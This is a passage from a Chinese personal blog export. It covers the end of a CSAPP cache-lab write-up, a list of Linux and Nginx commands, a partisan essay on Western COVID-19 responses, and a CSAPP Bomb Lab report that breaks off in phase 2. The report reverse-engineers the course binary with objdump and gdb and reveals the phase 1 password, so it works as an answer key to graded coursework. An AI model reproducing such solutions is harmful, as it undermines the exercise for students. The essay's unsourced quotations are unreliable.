<p>大概是 <img src="https://www.zhihu.com/equation?tex=4%5Ctimes+64%5Ctimes%28%5Cfrac%7B1%7D%7B8%7D%2B%5Cfrac%7B1%7D%7B4%7D%29%2B12%5Ctimes+64%5Ctimes2%5Ctimes%5Cfrac%7B1%7D%7B8%7D%3D288" alt="[公式]"></p>
<p>最后跑出来的答案是287，非常接近。</p>
<p><strong>64×64：</strong></p>
<p>首先考虑Cache中只能放4行A中的行，如果再用8×8的块，前面4行可以填入，后面4行会在Cache中发生冲突，导致miss次数增加。</p>
<p>如果只用4×4的块呢？那么每次Cache中放入8个int，我们却只用4个，浪费严重，我用这个方法最少也只能做到1677次miss。</p>
<p>有一种很巧妙的方法，就是还用8×8的块来做，题目说A数组不能变换，但是说B数组可以任意操作啊。我们必须要一步到位嘛？可否考虑先把数字移动到B中，然后在B中自己做变化。</p>
<p>考虑用同样的miss次数，把更多的数据移动到B中，但是不一定是正确的位置，然后再用同样的miss次数，把A中部分数据移动到B中时，完成把B中前面位置错误数据的纠正。</p>
<p>1.先考虑把A的上半部分存入到B，但是为了考虑Cache不冲突，所以把右上角的4×4的区域也存在B的右上角。对于在对角线上的块，A的miss率是1/8，B的左上角部分miss率是1/2。对于不在对角线上的块，A的miss率还是1/8，B左上角部分的miss率为1/4.</p>
<p>\2. 接下来这步是减少miss率的关键，把A左下角的一列4个数据读出，B右上角的一行4个数据读出，都用int变量暂存，然后把前四个填入B右上角行中，后四个填入B的左下角行中。</p>
<p>因为从B右上角读取的时候，把块放入了Cache，然后从A往B中填的时候，就不会出现miss操作。</p>
<p>来计算一下miss率，对于在对角线上的块，从A左下角读取miss率为1，B的右上角的操作miss率为1/4，B的左下角miss率为1/4。对于不在对角线的快，A的miss率为1/4，B右上角miss率为0，左下角miss率为1/4。</p>
<p>\3. 最后一步就是把A的右下角填入B的右下角，对于在对角线上的块，A的miss率为1/4，B的miss率为1/2.不在对角线上的块，A，B的miss率都为0.</p>
<p>最后我们来计算下miss的次数吧，计算出来近似是1280次，实际我们代码跑出来是1219次 。</p>
<p><strong>61×67：</strong></p>
<p>不规则的matrix，本质也是用分块来优化Cache的读写，但是不能找到比较显然的规律看出来间隔多少可以填满一个Cache，但是由于要求比较松，我们可以尝试一些分块的大小，直接进行转置操作。尝试到16左右 ，可以小于2000次miss。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux命令总结（持续更新中）</title>
    <url>/2020/04/12/Linux%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="nginx"><a class="markdownIt-Anchor" href="#nginx"></a> Nginx:</h1>
<ul>
<li>查看端口：netstat -ntpl;</li>
<li>结束监听：kill (number)</li>
<li>启动nginx服务：sudo service nginx start</li>
<li>停止nginx服务：sudo service nginx stop</li>
<li>重启nginx服务：service nginx restart；systemctl restart nginx</li>
<li>nginx访问日志的默认路径:/var/log/nginx</li>
<li>nginx配置文件：/etc/nginx/nginx.conf</li>
<li>nginx服务器默认目录:/usr/share/nginx/html</li>
<li>nginx -t 测试配置文件语法，同时告诉配置文件位置</li>
</ul>
<h1 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h1>
<ul>
<li>查看php所有软件包：rpm -qa|grep php</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>服务器</tag>
        <tag>后端开发</tag>
      </tags>
  </entry>
  <entry>
    <title>西方没有资本再傲慢了</title>
    <url>/2020/04/06/no-capital-to-be-arrogant-in-West/</url>
    <content><![CDATA[<h1 id="一种病毒两种制度"><a class="markdownIt-Anchor" href="#一种病毒两种制度"></a> 一种病毒，两种制度？</h1>
<blockquote>
<p>中国人若想消灭这次新型冠状病毒，需要的药房既不是西药疫苗，也不是中草药，而是自由和民主</p>
<p>——德国 《明镜》</p>
</blockquote>
<blockquote>
<p>在应对新冠病毒的处理方式上，民主制度显示了无可辩驳的优越性</p>
<p>——法国 《费加罗报》</p>
</blockquote>
<blockquote>
<p>传染疾病在民主国家的致死率，总是低于像中国这样的专制国家</p>
<p>专制国家缺少信息的自由流动和与民众的对话，会导致决策的失误</p>
<p>——英国 《经济学人》</p>
</blockquote>
<a id="more"></a>
<p><a href="https://www.economist.com/graphic-detail/2020/02/18/diseases-like-covid-19-are-deadlier-in-non-democracies">Diseases like covid-19 are deadlier in non-democracies(经济学人)</a></p>
<p>西方的民主优越理念，是西方对于中国抨击的主要理由，在这次疫情的爆发中，西方以中国为专制国家为理由对于中国爆发的疫情进行抨击、嘲笑、歧视，他们认为，是因为像中国这样一个“专制国家”，缺乏与民众的沟通，并且由于对于群众言论的审查、封杀而导致了新型冠状病毒的发生，他们对此不屑一顾，并且认为以中国如此“落后”的医疗条件都能使疫情逐渐好转，那在我们资本主义的“发达”国家中根本不成问题。</p>
<p>而事实上，西方资本主义国家在那里不停地摆数据、讲道理，极尽一切手段用来说明西方民主制度要比中国更为高明。在他们所得出的结论里，美国、加拿大、德国、法国这些西方资本主义国家是应对病毒最为可靠的国家，而像中国，却仅仅排在第51个位置。可是像美国这样一个应对H1N1如此失败的国家，它是有如何的脸面忝居首列呢？他们对于数据的恶意的挑选从而来进行一些完全没有科学依据的说明，西方的人文社科报告，尤其是此类关乎政治的报告，总是刻意地去美化西方而贬低社会主义国家。经过此次疫情我们完全可以看出，西方各种“权威组织”所进行的研究调查完全是不可靠的，只会沦为政治的附庸。</p>
<p>西方的资本在疫情面前潜逃了，而他们发达的媒体系统只顾着一味地欺骗群众和对于中国无尽的诋毁，他们的政府有的进行党争，而有的则在进行十年才能讨论出结果的议会。</p>
<blockquote>
<p>挪威虽然不能像中国那样在10天内建成有1000个床位的医院，而且在7年内才定下来一个仅有100个座位的会议厅，但他们会比中国做得更好，因为专制国家缺少信息的自由流动和与民众的对话，会导致决策的失误</p>
<p>——英国 《经济学人》</p>
</blockquote>
<p>而事实上，正是由于西方对于疫情的傲慢与忽视，导致新冠病毒在欧洲大肆横行，也正是由于西方所崇尚的自由与个人权力至上论，导致欧洲的病毒一发不可收拾，他们依然不带口罩，他们依然举行球赛，他们依然举办聚会，国家禁止举办1000人以上的聚会，他们就举办999人的，他们管这个叫做自由。但如此之“自由”只能导致害人害己。</p>
<p>事实上，正是由于西方所崇尚的民主优越论与自由至上论与他们所推崇的分权与多党执政导致他们的政府惯于使用欺骗、甩锅来进行党争，他们并没有对任何人民负起责任，他们只为了自己和他们的政党来谋取利益，他们只关注于支持他们的人，他们所崇尚的自由就是每一个人都不需要为另外一个人和整个集体负任何责任，与其说他们在“分权”，不如说他们在“分责”，他们只在乎国家资本的运作而不关心民众的死活。当记者向特朗普质疑“为什么富人可以得到这么多的物资而穷人却得不到”，他回答，“<strong>世界本来就是这样</strong>”。</p>
<p>在从前，他们靠着殖民和迫害穷人来发家致富；现在，他们又大行其道地谈论着民主。他们所谓的“自由”与“民主”让他们变得异常傲慢，他们听不见世界的声音，听不见民众的呼唤，这是一种被裹挟着的民主。</p>
<p>在推特上，许许多多质疑西方资本的声音被审查、封闭乃至封杀，这更像一个专制国家而非民主国家所进行的行为，他们歧视华裔，骂黄种人是“东亚病夫”，这更像是“民粹”而非“平等”的行为。</p>
<p><strong>西方已再一次到了至暗时刻，可是现在已经没有了丘吉尔</strong></p>
<h1 id="纳粹主义滋长"><a class="markdownIt-Anchor" href="#纳粹主义滋长"></a> 纳粹主义滋长</h1>
<p>事实上，在这一次疫情中，我也看到了纳粹主义滋生的苗头。事实上，不仅在西方，在中国内也有这种倾向的出现。纳粹主义又叫做“国家民族社会主义”，纳粹主义一般有以下几种表现：</p>
<blockquote>
<ol>
<li>极端的民族主义，以血统等标准划分民族，并以民族为单位叙事，尤其是<strong>以民族划分敌我关系</strong></li>
<li>**宣扬仇恨。**鼓吹对特定国家或族群的复仇，尤其是无底线的报复。</li>
<li>排外，要求建立纯粹民族或单一民族至上的国家。</li>
<li>鼓吹武力扩张，从根本上否认和平共存可能性。</li>
<li>极权思想，要求每个个体完全彻底为民族和国家利益服务，否定个人的选择自由。</li>
</ol>
</blockquote>
<p>在西方，许多民众将这一切归罪于中国，并将其认为是黄种人的过错，他们主张以暴力手段对于中国展开报复，他们对于华裔具有极大的恶意并且使用暴力手段对于华裔进行血腥报复，在他们国家恶意的引导下，我很怀疑这种纳粹主义倾向会不会卷土重来，而在当时的德国，希特勒就是利用一战后德国人对于犹太人的不满进而煽动反种族情绪，这是十分令人值得担心的。因为我们无法断定是否有疯狂的政府利用民众对于疫情的愤怒使用战争来进行祸水东流。</p>
<p>而在国内的网络社区中，我也经常看到经常有人对于西方乃至整个种族进行了极端恶意的排斥，我们可以对于某些人、某些政治人物进行排斥，但不能对于整个国家人民乃至整个种族进行污名化处理。</p>
<p><strong>这是我们应当做的。</strong></p>
]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>杂论</tag>
        <tag>爱国</tag>
      </tags>
  </entry>
  <entry>
    <title>Bomb Lab实验报告</title>
    <url>/2020/04/05/Bomb-Lab/</url>
    <content><![CDATA[<p><img src="/2020/04/05/Bomb-Lab/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="实验简介"><a class="markdownIt-Anchor" href="#实验简介"></a> 实验简介</h1>
<p>浏览<code>bomb.c</code>可知，本实验一共有6个关卡，由<code>phase_1</code>为例，该实验的运行格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Hmm...  Six phases must be more secure than one phase! */</span></span><br><span class="line">input = read_line();             <span class="comment">/* Get input                   */</span></span><br><span class="line">phase_1(input);                  <span class="comment">/* Run the phase               */</span></span><br><span class="line">phase_defused();                 <span class="comment">/* Drat!  They figured it out!</span></span><br><span class="line"><span class="comment">      * Let me know how they did it. */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Phase 1 defused. How about the next one?\n&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>显然，题目需要从标准输入或者文件输入参数，然后调用<code>phase</code>类函数来检查输入参数是否正确，想要获取到正确的密码，我们需要检查对应的参数储存在哪块地址。</p>
<h2 id="phase_1"><a class="markdownIt-Anchor" href="#phase_1"></a> Phase_1</h2>
<h3 id="实验过程"><a class="markdownIt-Anchor" href="#实验过程"></a> 实验过程：</h3>
<p>于是使用反汇编<code>bomb</code>可执行程序：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.asm</span><br></pre></td></tr></table></figure>
<p>在<code>bomb.asm</code>中查找main函数所对应的汇编代码，可以发现如下片段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e32: e8 67 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:    48 89 c7               mov    %rax,%rdi</span><br><span class="line">400e3a:    e8 a1 00 00 00         callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:    e8 80 07 00 00         callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:    bf a8 23 40 00         mov    $0x4023a8,%edi</span><br><span class="line">400e49:    e8 c2 fc ff ff         callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">400e4e:    e8 4b 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e53:    48 89 c7               mov    %rax,%rdi</span><br></pre></td></tr></table></figure>
<p>在<code>400e32</code>处调用了<code>read_line</code>函数，可以看出是在获取标准输入，下一步执行<code>mov %rax,%rdi</code>,表示将返回值存入到了<code>%rdi</code>寄存器中，然后立即调用<code>phase_1</code>函数，于是我们找到<code>phase_1</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:  48 83 ec 08            sub    $0x8,%rsp</span><br><span class="line">  400ee4:  be 00 24 40 00         mov    $0x402400,%esi</span><br><span class="line">  400ee9:  e8 4a 04 00 00         callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:  85 c0                  test   %eax,%eax</span><br><span class="line">  400ef0:  74 05                  je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:  e8 43 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:  48 83 c4 08            add    $0x8,%rsp</span><br><span class="line">  400efb:  c3                     retq   </span><br></pre></td></tr></table></figure>
<p>观察到<code>phase_1</code>首先将栈顶指针向下移了8位，然后将<code>0x402400</code>地址存入<code>%esi（%rsi）</code>寄存器中，然后调用了<code>strings_not_equal</code>这个函数，然后测试返回值是否为0，如果不为0将栈顶指针加8直接返回，否则直接调用<code>explode_bomb</code>函数（看名字是引爆炸弹），所以我们现在应该去strings_not_equal这个函数内查看:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0000000000401338</span> &lt;strings_not_equal&gt;:</span><br><span class="line">  <span class="number">401338</span>:  <span class="number">41</span> <span class="number">54</span>                  push   %r12</span><br><span class="line">  <span class="number">40133</span>a:  <span class="number">55</span>                     push   %rbp</span><br><span class="line">  <span class="number">40133b</span>:  <span class="number">53</span>                     push   %rbx</span><br><span class="line">  <span class="number">40133</span>c:  <span class="number">48</span> <span class="number">89</span> fb               mov    %rdi,%rbx</span><br><span class="line">  <span class="number">40133f</span>:  <span class="number">48</span> <span class="number">89</span> f5               mov    %rsi,%rbp</span><br><span class="line">  <span class="number">401342</span>:  e8 d4 ff ff ff         callq  <span class="number">40131b</span> &lt;string_length&gt;</span><br><span class="line">  <span class="number">401347</span>:  <span class="number">41</span> <span class="number">89</span> c4               mov    %eax,%r12d</span><br><span class="line">  <span class="number">40134</span>a:  <span class="number">48</span> <span class="number">89</span> ef               mov    %rbp,%rdi</span><br><span class="line">  <span class="number">40134</span>d:  e8 c9 ff ff ff         callq  <span class="number">40131b</span> &lt;string_length&gt;</span><br><span class="line">  <span class="number">401352</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">401357</span>:  <span class="number">41</span> <span class="number">39</span> c4               cmp    %eax,%r12d</span><br><span class="line">  <span class="number">40135</span>a:  <span class="number">75</span> <span class="number">3f</span>                  jne    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">40135</span>c:  <span class="number">0f</span> b6 <span class="number">03</span>               movzbl (%rbx),%eax</span><br><span class="line">  <span class="number">40135f</span>:  <span class="number">84</span> c0                  test   %al,%al</span><br><span class="line">  <span class="number">401361</span>:  <span class="number">74</span> <span class="number">25</span>                  je     <span class="number">401388</span> &lt;strings_not_equal+<span class="number">0x50</span>&gt;</span><br><span class="line">  <span class="number">401363</span>:  <span class="number">3</span>a <span class="number">45</span> <span class="number">00</span>               cmp    <span class="number">0x0</span>(%rbp),%al</span><br><span class="line">  <span class="number">401366</span>:  <span class="number">74</span> <span class="number">0</span>a                  je     <span class="number">401372</span> &lt;strings_not_equal+<span class="number">0x3a</span>&gt;</span><br><span class="line">  <span class="number">401368</span>:  eb <span class="number">25</span>                  jmp    <span class="number">40138f</span> &lt;strings_not_equal+<span class="number">0x57</span>&gt;</span><br><span class="line">  <span class="number">40136</span>a:  <span class="number">3</span>a <span class="number">45</span> <span class="number">00</span>               cmp    <span class="number">0x0</span>(%rbp),%al</span><br><span class="line">  <span class="number">40136</span>d:  <span class="number">0f</span> <span class="number">1f</span> <span class="number">00</span>               nopl   (%rax)</span><br><span class="line">  <span class="number">401370</span>:  <span class="number">75</span> <span class="number">24</span>                  jne    <span class="number">401396</span> &lt;strings_not_equal+<span class="number">0x5e</span>&gt;</span><br><span class="line">  <span class="number">401372</span>:  <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>            add    $<span class="number">0x1</span>,%rbx</span><br><span class="line">  <span class="number">401376</span>:  <span class="number">48</span> <span class="number">83</span> c5 <span class="number">01</span>            add    $<span class="number">0x1</span>,%rbp</span><br><span class="line">  <span class="number">40137</span>a:  <span class="number">0f</span> b6 <span class="number">03</span>               movzbl (%rbx),%eax</span><br><span class="line">  <span class="number">40137</span>d:  <span class="number">84</span> c0                  test   %al,%al</span><br><span class="line">  <span class="number">40137f</span>:  <span class="number">75</span> e9                  jne    <span class="number">40136</span>a &lt;strings_not_equal+<span class="number">0x32</span>&gt;</span><br><span class="line">  <span class="number">401381</span>:  ba <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x0</span>,%edx</span><br><span class="line">  <span class="number">401386</span>:  eb <span class="number">13</span>                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">401388</span>:  ba <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x0</span>,%edx</span><br><span class="line">  <span class="number">40138</span>d:  eb <span class="number">0</span>c                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">40138f</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">401394</span>:  eb <span class="number">05</span>                  jmp    <span class="number">40139b</span> &lt;strings_not_equal+<span class="number">0x63</span>&gt;</span><br><span class="line">  <span class="number">401396</span>:  ba <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>         mov    $<span class="number">0x1</span>,%edx</span><br><span class="line">  <span class="number">40139b</span>:  <span class="number">89</span> d0                  mov    %edx,%eax</span><br><span class="line">  <span class="number">40139</span>d:  <span class="number">5b</span>                     pop    %rbx</span><br><span class="line">  <span class="number">40139</span>e:  <span class="number">5</span>d                     pop    %rbp</span><br><span class="line">  <span class="number">40139f</span>:  <span class="number">41</span> <span class="number">5</span>c                  pop    %r12</span><br><span class="line">  <span class="number">4013</span>a1:  c3                     retq   </span><br></pre></td></tr></table></figure>
<p>完整的strings_not_equal如上图所示。首先函数将三个寄存器的内容压入栈中进行保护，然后分别将<code>%rdi,%rsi</code>中的内容移入至<code>%rbs,%rbp</code>中，然后调用<code>string_length</code>函数，通过函数名可以猜测该函数用来检测字符串的长度，然后返回时将返回值赋值给<code>%r12d</code>寄存器，随后将<code>%rbp</code>（地址<code>$0x402400</code>）的内容赋值给<code>%rdi</code>,随后几行分别再次调用<code>string_length</code>函数并进行与1的比较，也就是检测字符串的长度是否与目标字符串的长度吻合，如果吻合的话，继续向下执行。否则跳转至：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40139b:  89 d0                  mov    %edx,%eax</span><br><span class="line">40139d:  5b                     pop    %rbx</span><br><span class="line">40139e:  5d                     pop    %rbp</span><br><span class="line">40139f:  41 5c                  pop    %r12</span><br><span class="line">4013a1:  c3                     retq   </span><br></pre></td></tr></table></figure>
<p>即返回1。</p>
<p>继续向下观察，发现汇编指令中首先检查输入的首字符是否为空字符，即’/0’，即以下指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40135c:  0f b6 03               movzbl (%rbx),%eax</span><br><span class="line">40135f:  84 c0                  test   %al,%al</span><br></pre></td></tr></table></figure>
<p>这里将<code>%rbx</code>中的内容（即标准输入内容）取出，放入<code>%eax</code>中并进行了符号位扩展，如果为0的话就直接向下跳转，因为我们的目的是寻找目标字符串，所以不必管跳转内容，直接向下运行即可。</p>
<p>接着可以观察到以下指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmp    0x0(%rbp),%al</span><br></pre></td></tr></table></figure>
<p>即将<code>%rbp</code>(即内存<code>$0x402400</code>中的内容)与标准输入的第一个字符进行比对，由此看来，答案就呼之欲出了！标准密码就藏在地址<code>$0x402400</code>中。</p>
<p>于是我们在命令行使用<code>gdb</code>进行调试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">(gdb) b explode_bomb</span><br><span class="line">(gdb) x&#x2F;s 0x402400&#x2F;*查看密码*&#x2F;</span><br></pre></td></tr></table></figure>
<p>于是命令行输出：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402400:       &quot;Border relations with Canada have never been better.&quot;</span><br></pre></td></tr></table></figure>
<p>于是运行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) run</span><br></pre></td></tr></table></figure>
<p>根据提示输入标准输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Phase 1 defused. How about the next one?</span><br></pre></td></tr></table></figure>
<p>于是第一关就圆满地结束了！</p>
<h3 id="运行结果"><a class="markdownIt-Anchor" href="#运行结果"></a> 运行结果：</h3>
<p><img src="/2020/04/05/Bomb-Lab/phase1.png" alt></p>
<h2 id="phase_2"><a class="markdownIt-Anchor" href="#phase_2"></a> Phase_2</h2>
<h3 id="实验过程-2"><a class="markdownIt-Anchor" href="#实验过程-2"></a> 实验过程：</h3>
<p>同样地，在<code>main</code>函数里寻找关于<code>phase_2</code>函数的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e4e: e8 4b 06 00 00         callq  40149e &lt;read_line&gt;</span><br><span class="line">400e53:    48 89 c7               mov    %rax,%rdi</span><br><span class="line">400e56:    e8 a1 00 00 00         callq  400efc &lt;phase_2&gt;</span><br><span class="line">400e5b:    e8 64 07 00 00         callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure>
<p>可知输入放在了<code>%rdi</code>寄存器中。</p>
<p>下面查询phase_2的汇编代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:  55                     push   %rbp</span><br><span class="line">  400efd:  53                     push   %rbx</span><br><span class="line">  400efe:  48 83 ec 28            sub    $0x28,%rsp</span><br><span class="line">  400f02:  48 89 e6               mov    %rsp,%rsi</span><br><span class="line">  400f05:  e8 52 05 00 00         callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  400f0a:  83 3c 24 01            cmpl   $0x1,(%rsp)</span><br><span class="line">  400f0e:  74 20                  je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f10:  e8 25 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f15:  eb 19                  jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:  8b 43 fc               mov    -0x4(%rbx),%eax</span><br><span class="line">  400f1a:  01 c0                  add    %eax,%eax</span><br><span class="line">  400f1c:  39 03                  cmp    %eax,(%rbx)</span><br><span class="line">  400f1e:  74 05                  je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">  400f20:  e8 15 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:  48 83 c3 04            add    $0x4,%rbx</span><br><span class="line">  400f29:  48 39 eb               cmp    %rbp,%rbx</span><br><span class="line">  400f2c:  75 e9                  jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f2e:  eb 0c                  jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">  400f30:  48 8d 5c 24 04         lea    0x4(%rsp),%rbx</span><br><span class="line">  400f35:  48 8d 6c 24 18         lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:  eb db                  jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">  400f3c:  48 83 c4 28            add    $0x28,%rsp</span><br><span class="line">  400f40:  5b                     pop    %rbx</span><br><span class="line">  400f41:  5d                     pop    %rbp</span><br><span class="line">  400f42:  c3                     retq   </span><br></pre></td></tr></table></figure>
<p><code>400efe</code>: <code>sub $0x28,%rsp</code> 和 <code>400f02</code>: <code>mov %rsp,%rsi</code> 分配了一块 40 bytes 大小的空间，并将其地址传给了 <code>%rsi</code> 寄存器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rsi &#x3D; %rsp</span><br></pre></td></tr></table></figure>
<p><code>400f05</code>: <code>callq 40145c</code> 调用函数 <code>read_six_numbers</code>。从函数名推测其作用可能为读入 6 个数。</p>
<h4 id="观察函数read_six_numbers"><a class="markdownIt-Anchor" href="#观察函数read_six_numbers"></a> 观察函数read_six_numbers</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:</span><br><span class="line">  40145c:  48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">  401460:  48 89 f2               mov    %rsi,%rdx</span><br><span class="line">  401463:  48 8d 4e 04            lea    0x4(%rsi),%rcx</span><br><span class="line">  401467:  48 8d 46 14            lea    0x14(%rsi),%rax</span><br><span class="line">  40146b:  48 89 44 24 08         mov    %rax,0x8(%rsp)</span><br><span class="line">  401470:  48 8d 46 10            lea    0x10(%rsi),%rax</span><br><span class="line">  401474:  48 89 04 24            mov    %rax,(%rsp)</span><br><span class="line">  401478:  4c 8d 4e 0c            lea    0xc(%rsi),%r9</span><br><span class="line">  40147c:  4c 8d 46 08            lea    0x8(%rsi),%r8</span><br><span class="line">  401480:  be c3 25 40 00         mov    $0x4025c3,%esi</span><br><span class="line">  401485:  b8 00 00 00 00         mov    $0x0,%eax</span><br><span class="line">  40148a:  e8 61 f7 ff ff         callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  40148f:  83 f8 05               cmp    $0x5,%eax</span><br><span class="line">  401492:  7f 05                  jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:  e8 a1 ff ff ff         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:  48 83 c4 18            add    $0x18,%rsp</span><br><span class="line">  40149d:  c3                     retq   </span><br></pre></td></tr></table></figure>
<p>先看开始的部分：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40145c: 48 83 ec 18            sub    $0x18,%rsp</span><br><span class="line">401460:    48 89 f2               mov    %rsi,%rdx</span><br><span class="line">401463:    48 8d 4e 04            lea    0x4(%rsi),%rcx</span><br><span class="line">401467:    48 8d 46 14            lea    0x14(%rsi),%rax</span><br><span class="line">40146b:    48 89 44 24 08         mov    %rax,0x8(%rsp)</span><br><span class="line">401470:    48 8d 46 10            lea    0x10(%rsi),%rax</span><br><span class="line">401474:    48 89 04 24            mov    %rax,(%rsp)</span><br><span class="line">401478:    4c 8d 4e 0c            lea    0xc(%rsi),%r9</span><br><span class="line">40147c:    4c 8d 46 08            lea    0x8(%rsi),%r8</span><br></pre></td></tr></table></figure>
<p>译成C语言：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>* pos[<span class="number">3</span>];                       </span><br><span class="line">num0_pos = start_pos;              </span><br><span class="line">num1_pos = start_pos + <span class="number">1</span>;         </span><br><span class="line">tmp_pos  = start_pos + <span class="number">5</span>;          </span><br><span class="line">pos[<span class="number">1</span>]   = tmp_pos; tmp_pos  = start_pos + <span class="number">4</span>; </span><br><span class="line">pos[<span class="number">0</span>] = tmp_pos; </span><br><span class="line">num3_pos = start_pos + <span class="number">3</span>;           </span><br><span class="line">num2_pos = start_pos + <span class="number">2</span>;         </span><br></pre></td></tr></table></figure>
<p>于是得到各地址保存的位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%rdx &#x3D; %rsi</span><br><span class="line">%rcx &#x3D; %rsi + 4</span><br><span class="line">%r8 &#x3D; %rsi + 8</span><br><span class="line">%r9 &#x3D; %rsi + 12</span><br><span class="line">0x0(%rsp) &#x3D; %rsi + 16</span><br><span class="line">0x8(%rsp) &#x3D; %rsi + 20</span><br></pre></td></tr></table></figure>
<p>由上一节知，%rsi 寄存器存放的是调用者 %rsp 寄存器中的内容，因此这 6 个地址分别对应调用者栈里开始的 6 个连续 int 的地址。</p>
<h4 id="回到phase_2函数部分"><a class="markdownIt-Anchor" href="#回到phase_2函数部分"></a> 回到phase_2函数部分</h4>
<p>由之前的分析，我们确定了函数 <code>read_six_numbers</code> 的具体作用。此时栈内保存的信息为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0(%rsp) &#x3D; nums[0]</span><br><span class="line">0x4(%rsp) &#x3D; nums[1]</span><br><span class="line">0x8(%rsp) &#x3D; nums[2]</span><br><span class="line">0xc(%rsp) &#x3D; nums[3]</span><br><span class="line">0x10(%rsp) &#x3D; nums[4]</span><br><span class="line">0x14(%rsp) &#x3D; nums[5]</span><br></pre></td></tr></table></figure>
<p>其中，<code>nums[0]</code> ~ <code>nums[5]</code> 表示输入的字符串中解析得到的（前）6 个整数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400f0a: 83 3c 24 01            cmpl   $0x1,(%rsp)</span><br><span class="line">400f0e:    74 20                  je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f10:    e8 25 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f15:    eb 19                  jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f17:    8b 43 fc               mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:    01 c0                  add    %eax,%eax</span><br><span class="line">400f1c:    39 03                  cmp    %eax,(%rbx)</span><br><span class="line">400f1e:    74 05                  je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">400f20:    e8 15 05 00 00         callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f25:    48 83 c3 04            add    